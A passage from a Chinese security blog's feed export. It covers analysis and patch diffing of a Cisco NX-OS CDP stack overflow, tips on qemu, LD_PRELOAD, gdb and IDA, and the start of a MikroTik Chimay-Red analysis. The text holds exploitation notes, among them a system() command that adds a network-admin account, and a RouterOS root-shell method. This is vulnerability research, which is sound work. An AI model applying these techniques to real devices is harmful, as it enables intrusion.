*v35;  <span class="comment">// (5) </span></span><br><span class="line">          ++cdp_payload_pwr_req_level_ptr;</span><br><span class="line">          ++pwr_levels_count;</span><br><span class="line">          ++v35;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( cdp_payload_pwr_req_num_of_level &gt; pwr_levels_count );    <span class="comment">// controllable</span></span><br><span class="line">      &#125;</span><br><span class="line">      v9 = *((_WORD *)a1 + <span class="number">604</span>);</span><br><span class="line">      v10 = *((_WORD *)a1 + <span class="number">602</span>);</span><br><span class="line">      v11 = a1[<span class="number">303</span>];</span><br><span class="line">      <span class="keyword">if</span> ( cdp_payload_pwr_req_req_id != v9 || cdp_payload_pwr_req_mgmt_id != v10 ) <span class="comment">// (6)</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在后续进行漏洞利用时，由于在<code>(5)</code>处将<code>v35</code>指向的内存地址空间的内容保存到了<code>a1[pwr_levels_count + 311]</code>中，而该地址与函数<code>cdpd_poe_handle_pwr_tlvs()</code>的第一个参数有关，在覆盖栈上的返回地址之后也会覆盖该参数，因此需要构造一个合适的参数，使得<code>(5)</code>处不会崩溃。另外，还要保证<code>(6)</code>处的条件不成立，即执行<code>else</code>分支，否则在该函数返回前还会出现其他崩溃。</p><p>另外，<code>cdpd</code>程序启用的保护机制如下，同时设备上的<code>ASLR</code>等级为2。由于<code>cdpd</code>程序崩溃后会重启，因此需要通过爆破的方式来猜测程序相关的基地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file cdpd</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RPATH:    b&#x27;/isan/lib/convert:/isan/lib:/isanboot/lib&#x27;</span><br></pre></td></tr></table></figure><p>之后漏洞利用可以执行注入的<code>shellcode</code>，或者通过调用<code>system()</code>来执行自定义的<code>shell</code>命令。</p><blockquote><p>通过<code>/isan/bin/vsh</code>可以执行设备配置界面中的命令，如<code>system(&#39;/isan/bin/vsh -c &quot;conf t ; username aaa password test123! role network-admin&quot;</code>执行成功后，会添加一个<code>aaa</code>的管理用户。</p></blockquote><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>根据思科的<span class="exturl" data-url="aHR0cHM6Ly90b29scy5jaXNjby5jb20vc2VjdXJpdHkvY2VudGVyL2NvbnRlbnQvQ2lzY29TZWN1cml0eUFkdmlzb3J5L2Npc2NvLXNhLTIwMjAwMjA1LW54b3MtY2RwLXJjZQ==">漏洞公告<i class="fa fa-external-link-alt"></i></span>，该漏洞在如下的版本中已修复。</p><img data-src="images/cdp_nxos_fixed_version.png" style="zoom:90%"><p>以<code>7.0(3)I7(8)</code>为例，函数<code>cdpd_poe_handle_pwr_tlvs()</code>的部分伪代码如下。可以看到，在<code>(1)</code>处增加了对<code>Power Requested</code>字段个数的判断，其最大值为10。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">cdpd_poe_handle_pwr_tlvs</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2, _WORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( !result &amp;&amp; !v35 )  <span class="comment">// version 2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    v38 = __ROR2__(a3[<span class="number">1</span>], <span class="number">8</span>);</span><br><span class="line">    v33 = __ROR2__(a3[<span class="number">2</span>], <span class="number">8</span>);</span><br><span class="line">    v32 = __ROR2__(a3[<span class="number">3</span>], <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    v8 = v38 - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt; <span class="number">0</span> )</span><br><span class="line">      v8 = v38 - <span class="number">5</span>;</span><br><span class="line">    v29 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v29 &lt;= <span class="number">0xA</span>u )  <span class="comment">// (1)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      v36 = <span class="number">10</span>;  <span class="comment">// (2)</span></span><br><span class="line">      v28 = <span class="number">10</span>;</span><br><span class="line">      v29 = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v39 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *v37;</span><br><span class="line">      LOWORD(v9) = __ROR2__(*v37, <span class="number">8</span>);</span><br><span class="line">      v9 = __ROR4__(v9, <span class="number">16</span>);</span><br><span class="line">      LOWORD(v9) = __ROR2__(v9, <span class="number">8</span>);</span><br><span class="line">      v42[v39] = v9;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      a1[v39 + <span class="number">312</span>] = v42[v39];</span><br><span class="line">      ++v37;</span><br><span class="line">      ++v39;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v36 &gt; v39 );</span><br><span class="line">    <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>通过<code>GNS3</code>软件搭建设备的仿真环境，同时对该漏洞的形成原因进行了分析：在对<code>Power Request(type=0x19)</code>部分的数据进行解析时，由于缺乏对其内容长度的校验，造成栈溢出。</li></ul><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJtaXMuY29tL2NkcHduLw==">CDPwn: 5 Zero-Days in Cisco Discovery Protocol<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90b29scy5jaXNjby5jb20vc2VjdXJpdHkvY2VudGVyL2NvbnRlbnQvQ2lzY29TZWN1cml0eUFkdmlzb3J5L2Npc2NvLXNhLTIwMjAwMjA1LW54b3MtY2RwLXJjZQ==">Cisco NX-OS Software Cisco Discovery Protocol Remote Code Execution Vulnerability<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5pdGNydW5jaC5ldS9pbmRleC5waHAvMjAxNy8wOS8yMC92aXJ0dWFsaXppbmctY2lzY28tbmV4dXMtOWstd2l0aC1nbnMzLw==">VIRTUALIZING A CISCO NEXUS 9K WITH GNS3<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzExNTQv">CVE-2020-3119 Cisco CDP 协议栈溢出漏洞分析<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjA5MDE4">https://www.anquanke.com/post/id/209018<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【置顶】技巧misc</title>
      <link href="2020/05/09/%E6%8A%80%E5%B7%A7misc/"/>
      <url>2020/05/09/%E6%8A%80%E5%B7%A7misc/</url>
      
        <content type="html"><![CDATA[<h3 id="qemu仿真出现execve-错误"><a href="#qemu仿真出现execve-错误" class="headerlink" title="qemu仿真出现execve()错误"></a><code>qemu</code>仿真出现<code>execve()</code>错误</h3><p>在使用<code>qemu user mode</code>对单个程序进行仿真时，经常会遇到类似<code>&quot;execve(): No such file or directory&quot;</code>的错误，其是因为在仿真的程序中又调用<code>execve()</code>来运行其他程序，而此时默认会使用<code>x86/x86_64</code>架构的<code>ld</code>来加载程序。</p><a id="more"></a><blockquote><p><code>Linux</code>内核有一个名为<code>Miscellaneous Binary Format (binfmt_misc)</code>的机制，可以通过要打开文件的特性来选择到底使用哪个程序来打开，比如文件的扩展名或者文件头的<code>magic</code>等。</p><p>由于上述机制的存在，对于交叉编译后得到的静态程序，可以直接运行，当然通过<code>qemu_&lt;arch&gt;__static ./xxx</code>的方式也可以运行。</p></blockquote><p>解决上述错误有多种方式，最简单直接的方式是查看对应架构的<code>binfmt_misc</code>文件，然后将对应架构的<code>qemu_&lt;arch&gt;_static</code>拷贝到<code>chroot</code>后的<code>interpreter</code>路径。</p><blockquote><p>感谢<code>@Ch1p</code>提供的解决方案 :）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 以arm架构为例</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/sys/fs/binfmt_misc/qemu-arm<span class="comment"># 主机系统上的路径</span></span></span><br><span class="line">enabled</span><br><span class="line">interpreter /usr/bin/qemu-arm-static&lt;=== path</span><br><span class="line">flags: OC</span><br><span class="line">offset 0</span><br><span class="line">magic 7f454c4601010100000000000000000002002800</span><br><span class="line">mask ffffffffffffff00fffffffffffffffffeffffff</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以路由器文件系统为例, 将qemu-arm-static放到./usr/bin目录下即可.</span></span><br></pre></td></tr></table></figure><h3 id="LD-PRELOAD-hook动态链接库函数"><a href="#LD-PRELOAD-hook动态链接库函数" class="headerlink" title="LD_PRELOAD: hook动态链接库函数"></a><code>LD_PRELOAD</code>: hook动态链接库函数</h3><p><code>LD_PRELOAD</code>是<code>Linux</code>系统中的一个环境变量，利用它可以指定在程序运行前优先加载的动态链接库，实现在主程序和其他动态链接库的中间加载自定义的动态链接库，甚至覆盖正常的函数。一般而言，程序启动后会按一定顺序加载动态库：</p><ol><li>加载<code>LD_PRELOAD</code>指定的动态库；</li><li>加载文件<code>/etc/ld.so.preload</code>指定的动态库；</li><li>搜索<code>LD_LIBRARY_PATH</code>指定的动态库路径；</li><li>搜索路径<code>/lib64</code>下的动态库文件。</li></ol><p>在对嵌入式设备进行仿真时，经常需要进行环境修复，比如劫持与<code>NVRAM</code>相关的函数、<code>hook</code>某些函数使得程序继续运行不崩溃等。以<code>qemu user mode</code>为例，通过<code>-E</code>选项指定<code>LD_PRELOAD</code>环境变量，从而达到上述目的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=<span class="string">&#x27;&lt;custom_lib.so&gt;&#x27;</span> &lt;binary_path&gt; arg0 arg1</span></span><br></pre></td></tr></table></figure><p>有时，使用<code>LD_PRELOAD</code>环境变量可能会不起作用，可以采用另一种方式：修改<code>/etc/ld.so.preload</code>配置文件，指定需要加载的自定义动态链接库。</p><blockquote><p>通常，有2种常见的方式可以让<code>LD_PRELOAD</code>失效(上面提到的情况不属于这2种)：</p><ul><li>静态链接</li><li>设置文件的<code>setgid/setuid</code>标志：有<code>SUID</code>权限的程序，系统会忽略<code>LD_PRELOAD</code>环境变量</li></ul></blockquote><p>最后，推荐两个常用的用于<code>hook</code>的第三方库，代码及实现比较优雅，可以直接拿来使用或者参考借鉴：</p><ul><li><code>libnvram</code>：固件仿真框架<code>Firmadyne</code>中提供的用于模拟<code>NVRAM</code>行为的动态库，支持很多常见的<code>api</code>，同时还会解析固件中自带的一些默认键值对；</li><li><code>preeny</code>：支持很多常见的<code>api</code>，包括<code>socket</code>相关、<code>fork()</code>、<code>alarm()</code>、<code>rand()</code>等。</li></ul><h4 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h4><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1hZHluZS9saWJudnJhbQ==">libnvram<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3phcmR1cy9wcmVlbnk=">preeny<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="gdb命中断点后继续运行"><a href="#gdb命中断点后继续运行" class="headerlink" title="gdb命中断点后继续运行"></a><code>gdb</code>命中断点后继续运行</h3><p>在使用<code>gdb</code>进行调试时，有时侯想让程序命中断点执行一些操作后继续运行，比如<code>dump</code>指定内存地址处的内容、记录执行过的基本块地址等。在<code>gdb</code>中，让程序命中断点执行一些操作后继续运行，常见的方式有三种：</p><ul><li><p><code>define hook-stop</code>方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> gdb</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> b *0x12345678<span class="comment"># set breakpoint</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> define hook-stop</span></span><br><span class="line">x/4wx $esp# custom gdb command</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p><code>commands</code>命令 + <code>gdb.events</code>事件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb_event.py</span></span><br><span class="line"><span class="comment"># !!! call gdb.execute(&#x27;continue&#x27;) in event functions will cause recursive call</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_stop_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event, gdb.BreakpointEvent):</span><br><span class="line">        <span class="comment"># do what you want</span></span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(handle_stop_event)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">&gt; b *<span class="number">0x12345678</span></span><br><span class="line">&gt; source gdb_event.py<span class="comment"># run python script in gdb</span></span><br><span class="line">&gt; commands <span class="number">1</span><span class="comment"># breakpoint num</span></span><br><span class="line"><span class="keyword">continue</span><span class="comment"># custom gdb command</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>自定义<code>gdb.Breakpoint</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># custom_gdb.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyBreakpoint</span>(<span class="params">gdb.Breakpoint</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># do what you want</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>    <span class="comment"># continue automatically</span></span><br><span class="line"></span><br><span class="line">MyBreakpoint(<span class="string">&quot;*&#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">0x12345678</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">&gt; source custom_gdb.py</span><br></pre></td></tr></table></figure></li></ul><p>其中，在<code>hook-stop</code>中运行<code>continue</code>命令似乎仅在第一次有效，后续命中断点后还是会停下来；而采用<code>commands + gdb.events</code>方式有时在多线程中会报异常；采用自定义<code>gdb.Breakpoint</code>方式是比较推荐的。</p><p>另外，如果只是想在命中断点后，打印指定内存地址处的内容，一种更好地方式是直接使用<code>dprtinf</code>命令，其原理是设置断点(<code>dprintf</code>类型)，然后调用<code>printf</code>输出，之后再继续运行行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dprintf location,template,expression[,expression…]</span><br></pre></td></tr></table></figure><h4 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h4><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNTY3NzExMDYvaG93LXRvLWNvbnRpbnVlLXRoZS1leGVjdGlvbi1hZnRlci1oaXR0aW5nLWJyZWFrcG9pbnRzLWluLWdkYg==">How to continue the exection after hitting breakpoints in gdb?<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2V3YXJlLm9yZy9nZGIvb25saW5lZG9jcy9nZGIvSG9va3MuaHRtbA==">User-defined Command Hooks<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2V3YXJlLm9yZy9nZGIvY3VycmVudC9vbmxpbmVkb2NzL2dkYi9FdmVudHMtSW4tUHl0aG9uLmh0bWw=">Events In Python<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2V3YXJlLm9yZy9nZGIvY3VycmVudC9vbmxpbmVkb2NzL2dkYi9CcmVha3BvaW50cy1Jbi1QeXRob24uaHRtbA==">Manipulating breakpoints using Python<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kb2MuZWNvc2NlbnRyaWMuY29tL2dudXRvb2xzL2RvYy9nZGIvRHluYW1pYy1QcmludGYuaHRtbA==">Dynamic Printf<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Npc2NvLVRhbG9zL211dGlueS1mdXp6ZXIvYmxvYi9leHBlcmltZW50L2hhcm5lc3Nlcy9nZGJfZnV6el9oYXJuZXNzLnB5">gdb events example<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="IDA命令行运行idapython脚本"><a href="#IDA命令行运行idapython脚本" class="headerlink" title="IDA命令行运行idapython脚本"></a><code>IDA</code>命令行运行<code>idapython</code>脚本</h3><p>在<code>IDA</code> <code>GUI</code>中可以通过执行<code>idapython</code>脚本来完成一些特定的工作，如果需要对多个程序执行相同的操作，一种方式是在<code>IDA</code> <code>GUI</code>中逐个程序执行对应的脚本，另一种更优雅的方式则是通过<code>IDA</code>命令行进行自动化批量分析。</p><p>以<code>Windows</code>平台为例，针对单个程序，通过命令行自动执行<code>idapython</code>脚本的步骤如下：</p><ol><li><p>调用<code>idat.exe/idat64.exe</code>对程序进行初始分析，生成对应的<code>idb</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> processor <span class="built_in">type</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> x86/x86_64: metapc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> arm: arm/armb</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mips: mipsl/mipsb</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PowerPC: ppcl/ppc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="string">&quot;&lt;ida_path&gt;&quot;</span> -A -B -L<span class="string">&quot;&lt;log_file&gt;&quot;</span> -p&lt;processor_type&gt; -o&lt;idb_path&gt; &lt;binary_path&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>基于生成的<code>idb</code>文件，运行对应的自动化脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="string">&quot;&lt;ida_path&gt;&quot;</span> -A -S<span class="string">&quot;&lt;script_path&gt; &lt;arg1&gt; &lt;arg2&gt;&quot;</span> -L<span class="string">&quot;&lt;log_file&gt;&quot;</span> &lt;idb_path&gt;</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>添加<code>-L&lt;log_file&gt;</code>选项，便于查看和定位<code>idapython</code>脚本中的错误</p></blockquote><p>其中，<code>idapython</code>脚本中通过<code>ARGV[i]</code>来获取传递的参数，同时最后通过调用<code>idc.Exit(0)</code>退出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arg1 = ARGV[<span class="number">1</span>]</span><br><span class="line">arg2 = ARGV[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># ...  # do what you want </span></span><br><span class="line">idc.Exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>Linux</code>平台与<code>Windows</code>平台类似，但存在细微差别：1) <code>ida</code>可执行程序变为<code>idal/idal64</code>；2) 在命令行参数最开始加上<code>TVHEADLESS=1</code>，最后可加上 <code>&gt; /dev/null</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> TVHEADLESS=1 <span class="string">&quot;&lt;ida_path&gt;&quot;</span> -B -p<span class="string">&quot;&lt;processor_type&gt;&quot;</span> -o<span class="string">&quot;&lt;idb_path&gt;&quot;</span> <span class="string">&quot;&lt;binary_path&gt;&quot;</span> &gt; /dev/null</span></span><br></pre></td></tr></table></figure><p>另外，推荐一个<code>nccgroup</code>开源的框架<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3VwL2lkYWh1bnQ=">idahunt<i class="fa fa-external-link-alt"></i></span>，其支持对二进制文件进行批量分析，也能执行<code>idapython</code>脚本，功能比较强大，感兴趣的可以看看。</p><h4 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h4><p><a href="ida_cmdline_demo.zip">示例脚本</a></p><h4 id="相关链接-2"><a href="#相关链接-2" class="headerlink" title="相关链接"></a>相关链接</h4><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGV4LXJheXMuY29tL3Byb2R1Y3RzL2lkYS9zdXBwb3J0L2lkYWRvYy80MTcuc2h0bWw=">IDA Help: Command line switches<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3VwL2lkYWh1bnQ=">idahunt: a framework to analyze binaries with IDA Pro<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mikrotik Chimay-Red 分析</title>
      <link href="2020/03/03/Mikrotik-Chimay-Red-%E5%88%86%E6%9E%90/"/>
      <url>2020/03/03/Mikrotik-Chimay-Red-%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Chimay-Red</code>是针对<code>MikroTik RouterOs</code>中<code>www</code>程序存在的一个漏洞的利用工具，该工具在泄露的<code>Vault 7</code>文件中提及。利用该工具，在无需认证的前提下可在受影响的设备上实现远程代码执行，从而获取设备的控制权。该漏洞本质上是一个整数溢出漏洞，对漏洞的利用则通过堆叠远程多线程栈空间的思路完成。更多信息可参考博客<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNlZWtpbnRvby5jb20vY2hpbWF5LXJlZC8=">Chimay-Red<i class="fa fa-external-link-alt"></i></span>。</p><p>下面结合已有的漏洞利用脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JpZ05lcmQ5NS9DaGltYXktUmVk">Chimay-Red<i class="fa fa-external-link-alt"></i></span>，对该漏洞的形成原因及利用思路进行分析。</p><a id="more"></a><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><code>MikroTik</code>官方提供了多种格式的镜像，可以利用<code>.iso</code>和<code>.vmdk</code>格式的镜像，结合<code>VMware</code>虚拟机来搭建仿真环境。具体的步骤可参考文章 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL3RlbmFibGUtdGVjaGJsb2cvbWFrZS1pdC1yYWluLXdpdGgtbWlrcm90aWstYzkwNzA1NDU5YmM2">Make It Rain with MikroTik<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXhpLi9maW5kaW5nLWFuZC1leHBsb2l0aW5nLWN2ZS0yMDE4LTc0NDUtZjMxMDNmMTYzY2Mx">Finding and exploiting CVE-2018–7445<i class="fa fa-external-link-alt"></i></span>，这里不再赘述。</p><p>根据<code>MikroTik</code>官方的公告，该漏洞在<code>6.38.5</code>及之后的版本中进行了修复，这里选取以下镜像版本进行分析。</p><ul><li><code>6.38.4</code>，<code>x86</code>架构，用于进行漏洞分析</li><li><code>6.38.5</code>，<code>x86</code>架构，用于进行补丁分析</li></ul><p>搭建起仿真环境后，还需要想办法获取设备的<code>root shell</code>，便于后续的分析与调试。参考议题<code>《Bug Hunting in RouterOS》</code>，获取<code>root shell</code>的方法如下：</p><ol><li>通过挂载<code>vmdk</code>并对其进行修改：在<code>/rw/pckg</code>目录下新建一个指向<code>/</code>的符号链接(<code>ln -s / .hidden</code>)</li><li>重启虚拟机后，以<code>ftp</code>方式登录设备，切换到<code>/</code>路径(<code>cd .hidden</code>)，在<code>/flash/nova/etc</code>路径下新建一个<code>devel-login</code>目录</li><li>以<code>telnet</code>方式登录设备(<code>devel/&lt;admin账户的密码&gt;</code>)，即可获取设备的<code>root shell</code></li></ol><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>借助<code>bindiff</code>工具对两个版本中的<code>www</code>程序进行比对，匹配结果中相似度较低的函数如下。</p><img data-src="images/bindiff_matched.png" style="zoom:75%"><p>逐个对存在差异的函数进行分析，结合已知的漏洞信息，确定漏洞存在于<code>Request::readPostDate()</code>函数中，函数控制流图对比如下。</p><img data-src="images/bindiff_flow_graph.png" style="zoom:75%"><p><code>6.38.4</code>版本中<code>Request::readPostDate()</code>函数的部分伪代码如下，其主要逻辑是：获取请求头中<code>content-length</code>的值，根据该值分配对应的栈空间，然后再从请求体中读取对应长度的内容到分配的缓冲区中。由于<code>content-length</code>的值外部可控，且缺乏有效的校验，显然会存在问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">Request::readPostData</span><span class="params">(Request *<span class="keyword">this</span>, <span class="built_in">string</span> *a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v8, <span class="string">&quot;content-length&quot;</span>);</span><br><span class="line">  v3 = Headers::getHeader((Headers *)<span class="keyword">this</span>, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v8, &amp;v9);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span 